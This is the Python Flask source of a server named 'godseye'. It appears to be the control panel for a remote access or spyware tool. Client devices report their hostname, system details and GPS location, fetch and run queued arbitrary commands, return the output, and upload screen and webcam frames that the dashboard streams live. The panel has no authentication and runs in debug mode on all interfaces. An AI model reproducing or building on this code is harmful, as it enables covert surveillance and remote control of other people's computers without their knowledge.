from flask import Flask, request, jsonify, render_template, send_from_directory, redirect, url_for, Response
from models import db, Device, Command
import os
import datetime
import time

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///godseye.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = os.path.join(app.root_path, 'static', 'screenshots')

# Global storage for latest frames
# Structure: {'device_id_screen': bytes, 'device_id_cam': bytes}
latest_frames = {}

db.init_app(app)

if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# ... (database init moved to main)

@app.route('/')
def index():
    devices = Device.query.all()
    # Check for offline devices (e.g. not seen in 1 minute)
    for d in devices:
        if d.last_seen and (datetime.datetime.now() - d.last_seen).total_seconds() > 60:
            d.is_online = False
    db.session.commit()
    return render_template('index.html', devices=devices)

@app.route('/device/<int:device_id>')
def device_detail(device_id):
    device = Device.query.get_or_404(device_id)
    commands = Command.query.filter_by(device_id=device_id).order_by(Command.created_at.desc()).limit(10).all()
    return render_template('device.html', device=device, commands=commands)

# API Endpoints for Client
@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    hardware_id = data.get('hardware_id')
    if not hardware_id:
        return jsonify({'error': 'No hardware_id'}), 400

    device = Device.query.filter_by(hardware_id=hardware_id).first()
    if not device:
        device = Device(hardware_id=hardware_id)
        db.session.add(device)
    
    device.name = data.get('hostname')
    device.ip_address = request.remote_addr
    device.os_info = data.get('os_info')
    device.cpu_usage = data.get('cpu')
    device.ram_usage = data.get('ram')
    device.total_ram = data.get('total_ram')
    device.location_lat = data.get('lat')
    device.location_lon = data.get('lon')
    device.last_seen = datetime.datetime.now()
    device.is_online = True

    try:
        db.session.commit()
        
        # Check for pending commands
        pending_commands = Command.query.filter_by(device_id=device.id, status='pending').all()
        command_list = []
        for cmd in pending_commands:
            command_list.append({
                'id': cmd.id,
                'command': cmd.command_text
            })
            cmd.status = 'sent' 
            
        db.session.commit()
        
        return jsonify({'status': 'ok', 'commands': command_list})
    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result', methods=['POST'])
def command_result():
    data = request.json
    cmd_id = data.get('command_id')
    output = data.get('output')
    
    cmd = Command.query.get(cmd_id)
    if cmd:
        cmd.output = output
        cmd.status = 'executed'
        cmd.executed_at = datetime.datetime.now()
        db.session.commit()
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'Command not found'}), 404

@app.route('/api/upload_screen/<hardware_id>', methods=['POST'])
def upload_screen(hardware_id):
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    device = Device.query.filter_by(hardware_id=hardware_id).first()
    if not device:
        return jsonify({'error': 'Device not found'}), 404

    # Update latest frame
    file_bytes = file.read()
    latest_frames[f"{device.id}_screen"] = file_bytes

    # Save filename as device_id.jpg (overwrite latest) for static view
    filename = f"{device.id}.jpg"
    with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'wb') as f:
        f.write(file_bytes)
    
    return jsonify({'status': 'ok'})

@app.route('/api/upload_cam/<hardware_id>', methods=['POST'])
def upload_cam(hardware_id):
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    device = Device.query.filter_by(hardware_id=hardware_id).first()
    if not device:
        return jsonify({'error': 'Device not found'}), 404

    # Update latest frame
    file_bytes = file.read()
    latest_frames[f"{device.id}_cam"] = file_bytes

    # Save filename as device_id_cam.jpg (overwrite latest)
    filename = f"{device.id}_cam.jpg"
    with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'wb') as f:
        f.write(file_bytes)
    
    return jsonify({'status': 'ok'})

def gen_frames(device_id, source):
    key = f"{device_id}_{source}"
    while True:
        frame = latest_frames.get(key)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        time.sleep(0.1) # Limit to 10fps check

@app.route('/video_feed/<int:device_id>/<source>')
def video_feed(device_id, source):
    return Response(gen_frames(device_id, source), mimetype='multipart/x-mixed-replace; boundary=frame')

# Dashboard Commands
@app.route('/device/<int:device_id>/command', methods=['POST'])
def send_command(device_id):
    command_text = request.form.get('command')
    if command_text:
        cmd = Command(device_id=device_id, command_text=command_text)
        db.session.add(cmd)
        db.session.commit()
    return redirect(url_for('device_detail', device_id=device_id))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)
